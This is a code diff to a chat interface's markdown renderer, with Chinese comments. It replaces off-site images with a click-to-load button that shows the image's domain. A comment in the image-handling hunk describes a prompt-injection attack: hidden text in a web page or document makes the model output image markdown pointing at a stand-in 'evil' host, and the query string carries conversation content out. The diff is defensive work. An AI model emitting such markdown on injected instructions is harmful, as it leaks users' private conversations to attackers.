@@ -58,6 +58,9 @@
     return out.split(MARK).join('')
   }
 
+  /** 人点过「加载」的站外图片地址。只在这一页的内存里，刷新就忘（见 RE_IMG 那段）。 */
+  const loadedImages = new Set()
+
   /** 判「这条相对地址是不是还在站内」用的假基地址。只用来比对源，不会出现在输出里。 */
   const RELATIVE_BASE = 'https://satu.invalid/'
   const RELATIVE_ORIGIN = 'https://satu.invalid'
@@ -279,6 +282,35 @@
     s = s.replace(RE_IMG, (m, alt, url, title) => {
       const href = safeUrl(url, 'img')
       if (!href) return hold(store, esc(alt))
+      /**
+       * **站外图片不自动加载，点了才拉。**
+       *
+       * 图片是浏览器自己去取的，不用点：模型读到的网页或文档里藏一句指令，让它输出
+       * `![](https://evil/?d=<对话里的内容>)`，渲染的那一刻内容就顺着 query 出去了。safeUrl
+       * 那边挡住了相对地址的几种变形，可绝对的 https 地址本来就放行（CSP 的 img-src 也开着，
+       * 理由见 gateway/src/http.ts），所以闸只能设在这里：先摆一颗写着域名的按钮，人点了
+       * 才换成真的 <img>。点过的地址这一页里记着（loadedImages），重画时不再变回按钮。
+       */
+      if (/^https?:\/\//i.test(href) && !loadedImages.has(href)) {
+        let host = ''
+        try {
+          host = new URL(href).host
+        } catch {}
+        return hold(
+          store,
+          '<button type="button" class="sw-md-remote-img" data-md="remote-image" data-md-act="load-image" data-src="' +
+            esc(href) +
+            '" data-alt="' +
+            esc(alt) +
+            '" title="' +
+            esc(href) +
+            '">' +
+            esc(L('点击加载图片')) +
+            (host ? '（' + esc(host) + '）' : '') +
+            (alt ? '：' + esc(alt) : '') +
+            '</button>',
+        )
+      }
       return hold(
         store,
         '<img data-md="image" src="' +
@@ -1066,6 +1098,18 @@
       e.preventDefault()
       e.stopPropagation()
       const act = btn.getAttribute('data-md-act')
+      if (act === 'load-image') {
+        // 人点了才拉（见 inline 里 RE_IMG 那段）。记下这个地址，之后重画同一条消息时直接出图。
+        const src = btn.getAttribute('data-src') || ''
+        if (!/^https?:\/\//i.test(src)) return
+        loadedImages.add(src)
+        const img = document.createElement('img')
+        img.setAttribute('data-md', 'image')
+        img.alt = btn.getAttribute('data-alt') || ''
+        img.src = src
+        btn.replaceWith(img)
+        return
+      }
       const fig = btn.closest('figure, .sw-table')
       if (!fig) return
 
